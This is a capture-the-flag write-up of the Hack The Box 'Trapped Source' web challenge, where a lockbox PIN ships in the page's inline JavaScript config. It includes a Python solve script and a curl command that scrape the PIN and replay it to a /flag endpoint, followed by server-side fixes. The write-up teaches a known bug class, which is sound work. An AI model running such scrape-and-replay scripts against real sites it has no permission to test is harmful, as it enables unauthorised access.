---
title: "Trapped Source"
date: 2026-09-26 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, client-side, information-disclosure, view-source]
description: "A four-digit PIN lockbox that looks like it needs brute-forcing — until you read the page source. The 'correct' PIN ships to the browser inside an inline window.CONFIG object, and the server's /flag endpoint trusts the exact value it already handed you. Classic client-side enforcement of server-side security."
---

## Overview

`Trapped Source` is a Very Easy HackTheBox **Web** challenge: a stylish four-button PIN
lockbox guarding a door. It looks like you need to guess a 4-digit PIN, but the answer
is shipped straight to your browser. The page embeds the "correct" PIN in an inline
JavaScript config object, and a `/flag` endpoint hands back the secret to anyone who
replays that same value — a textbook [client-side enforcement of server-side security](https://cwe.mitre.org/data/definitions/602.html)
([CWE-602](https://cwe.mitre.org/data/definitions/602.html)). The challenge name is the
whole hint: view the source.

## The technique

When a web app enforces a check in JavaScript and stores the secret it's guarding in the
same client-delivered code, there is no real security boundary — everything the browser
can read, the attacker can read too. Here the lockbox compares your input against a value
baked into the HTML, then asks the server for the flag using that value. The server's only
"authorization" is the very PIN it already disclosed to the client, so you never need to
touch the on-screen keypad. This is the same family of bug as a secret baked into a JS
bundle ([CWE-540](https://cwe.mitre.org/data/definitions/540.html)) — the data exposure
*is* the vulnerability.

## Solution

Fetch the landing page and read the inline config — the PIN is right there:

```html
<script>
  window.CONFIG = window.CONFIG || {
    buildNumber: "v20190816",
    debug: false,
    modelName: "Valencia",
    correctPin: "8150",
  }
</script>
```

The linked `static/js/script.js` shows what happens on a correct PIN — it simply POSTs the
same value to `/flag`:

```js
if (CONFIG.correctPin == pin) {
  fetch('/flag', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ 'pin': CONFIG.correctPin })
  })
  .then((data) => data.json())
  .then((res) => { /* render res.message */ });
}
```

So we skip the UI entirely: leak the PIN from the source, replay it to `/flag`.

Create `solve.py`:

```python
#!/usr/bin/env python3
import sys, re, json, urllib.request

base = sys.argv[1].rstrip('/') if len(sys.argv) > 1 else "http://127.0.0.1:1337"

def get(path):
    return urllib.request.urlopen(base + path, timeout=10).read().decode()

html = get('/')
pin = re.search(r'correctPin"?\s*:\s*"(\d+)"', html).group(1)
print(f"[+] leaked correctPin from client source: {pin}")

req = urllib.request.Request(base + '/flag',
    data=json.dumps({'pin': pin}).encode(),
    headers={'Content-Type': 'application/json'})
res = json.loads(urllib.request.urlopen(req, timeout=10).read())
print("[+] flag:", res['message'].strip())
```

Run it against the instance:

```bash
python3 solve.py http://<target>:<port>
```

```
[+] leaked correctPin from client source: 8150
[+] flag: HTB{...}
```

A one-liner with `curl` does the same job:

```bash
curl -s -X POST http://<target>:<port>/flag -H 'Content-Type: application/json' -d '{"pin":"8150"}'
```

## Why it worked

The PIN check and the secret it guarded both lived in client-controlled code. Anything in
HTML/JS that reaches the browser is fully visible and editable by the user — it is not a
trust boundary. "View Source", DevTools, or a single `curl` reveals it, and the `/flag`
endpoint trusts a value it had already disclosed, so no real verification ever happens.

## Fix / defense

- Never put secrets, answers, or authorization logic in client-side code.
- Validate exclusively server-side: the `/flag` endpoint must authenticate the caller
  independently, not trust a value it previously sent to the client.
- Keep PINs/passwords server-side and rate-limit verification attempts.
